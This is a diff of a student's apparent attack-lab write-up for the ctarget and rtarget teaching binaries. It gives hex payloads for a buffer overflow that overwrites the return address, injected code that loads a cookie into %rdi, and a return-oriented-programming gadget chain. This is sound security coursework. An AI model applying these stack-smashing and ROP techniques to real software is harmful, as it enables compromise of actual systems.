@@ -1,42 +1,52 @@
 PHASE 1 -----------------
 Started by looking at ctarget.s (objdump -d ctarget > ctarget.s).
 This showed me that it is allocation 0x18 (24) bytes.
-I created phase1.txt which contained 13 13 40 (address 401313 in Little Endian) after 24 bytes. Needed to overflow buffer and place 13 13 40 in the return address.
+    4012fd:	48 83 ec 18          	sub    $0x18,%rsp
+I created phase1.txt which contained 13 13 40 (address 401313 in Little Endian) (address of touch1) after 24 bytes. Needed to overflow buffer and place 13 13 40 in the return address.
+    00 00 00 00 00 00 00 00 //buffer
+    00 00 00 00 00 00 00 00 //buffer
+    00 00 00 00 00 00 00 00 //buffer to get 13 13 40 to the return address.
+    13 13 40 00 00 00 00 00
 I used ./hex2raw to get raw-phase1.txt and applied that to ./ctarget
 
 PHASE 2 -----------------
+//Pass in some code to call touch2 and the cookie string as an argument to touch2
 Created phase2.s which is a movq instruction for my cookie to %rdi, then return. This is because the first argument to a function is passed in %rdi. I want my cookie in %rdi as to make it appear as if it was an input.
 I created phase2.d from objdump -d phase2.o (which was created from gcc -c phase2.s).
-phase3.s is:
-movq $0x25095d88,%rdi /*Moving my cookie to register %rdi*/
-retq
+phase2.s is:
+    movq $0x25095d88,%rdi /*Moving my cookie to register %rdi*/
+    retq
 
 
 phase2.d is the byte representation for my assemble code in phase2.s.
 I then ran gdb ctarget with a breakpoint at getbuf and continued until the string input.
 This input had to longer than 24 characters to overflow the buffer. (I typed "This needs to be longer than the buffer which is 24 chars.")
 I did x/s $rsp to get the address I needed. I then created phase2.txt which was:
-48 c7 c7 88 5d 09 25 c3 //sets my cookie from phase2.d
-00 00 00 00 00 00 00 00 //buffer padding
-00 00 00 00 00 00 00 00 //padding makes it 24 bytes
-58 2c 68 55 00 00 00 00 //address of %rsp (from x/s $rsp)
-3f 13 40 00 00 00 00 00 //address of touch2 (in Little Endian)
+    48 c7 c7 88 5d 09 25 c3 //sets my cookie from phase2.d
+    00 00 00 00 00 00 00 00 //buffer padding
+    00 00 00 00 00 00 00 00 //padding makes it 24 bytes
+    58 2c 68 55 00 00 00 00 //address of %rsp (from x/s $rsp)
+    3f 13 40 00 00 00 00 00 //address of touch2 (in Little Endian)
 
 I used ./hex2raw < phase2.txt > raw-phase2.txt and got the correct output.
 
 PHASE 3 -----------------
+//call touch3 and pass our cookie as input.
 Very similar to phase 2. Passed our cookie in as a string instead.
-Coodie address to $rdi by calculating buffer + 8 bytes for address of rsp + 8 bytes for address of touch3. = 0x18 + 0x8 + 0x8 = 0x28 = 40 decimal.
+Cookie address to $rdi by calculating buffer + 8 bytes for address of rsp + 8 bytes for address of touch3. = 0x18 + 0x8 + 0x8 = 0x28 = 40 decimal.
 Took address for rsp from phase 2 (55 68 2c 58) and added 0x28.
-Used the above info for phase3.s.
+Used the above info for phase3.s. This is the address for pushing the cookie to rdi.
+    movq $0x55682C80,%rdi
+    retq
+
 Created phase3.d from objdump -d phase3.o (which was created from gcc -c phase3.s).
 Created phase3.txt which was:
-48 c7 c7 80 2c 68 55 c3 //rsp + 0x28, address where cookie is present
-00 00 00 00 00 00 00 00 //padding
-00 00 00 00 00 00 00 00 //padding
-58 2c 68 55 00 00 00 00 //$rsp return address
-50 14 40 00 00 00 00 00 //address of touch3 from ctarget.s
-32 35 30 39 35 64 38 38 //cookie string
+    48 c7 c7 80 2c 68 55 c3 //rsp + 0x28, address where cookie is present
+    00 00 00 00 00 00 00 00 //padding
+    00 00 00 00 00 00 00 00 //padding
+    58 2c 68 55 00 00 00 00 //$rsp return address
+    50 14 40 00 00 00 00 00 //address of touch3 from ctarget.s
+    32 35 30 39 35 64 38 38 //cookie string (as interpreted by a hex to ascii converter)
 Need to get ctarget to execute touch3 instead of returning to test. String representation of cookie is the input for touch3.
 
 PHASE 4 ----------------- (Return oriented programming)
@@ -45,8 +55,8 @@ Started by looking in rtarget.s (objdump -d rtarget > rtarget.s).
         Found 401515 <getval_298> where 
             401515: b8 58 90 90 90
             40151a: c3
-        Moved 401515 1 byte to get 58 at the left most positioin.
-    Looked for movq %rax %rdi, which is represented by 48 89 c7.
+        Moved 401515 1 byte to get 58 at the left most position (results in 401516).
+    Looked for movq %rax %rdi, followed by retq, which is represented by 48 89 c7.
         Found 40150e <setval_103> where
             401510: c7 07 48 89 c7 c3
 Created phase4.txt: 
@@ -54,7 +64,7 @@ Created phase4.txt:
 00 00 00 00 00 00 00 00 //buffer
 00 00 00 00 00 00 00 00 //buffer. Need 24 byte buffer
 16 15 40 00 00 00 00 00 //gadget 1: popq %rax
-88 5d 09 25 00 00 00 00 //cookie string
+88 5d 09 25 00 00 00 00 //cookie string from cookie.txt
 10 15 40 00 00 00 00 00 //gadget 2: move %rax to %rdi
 3f 13 40 00 00 00 00 00 //address of touch2
 
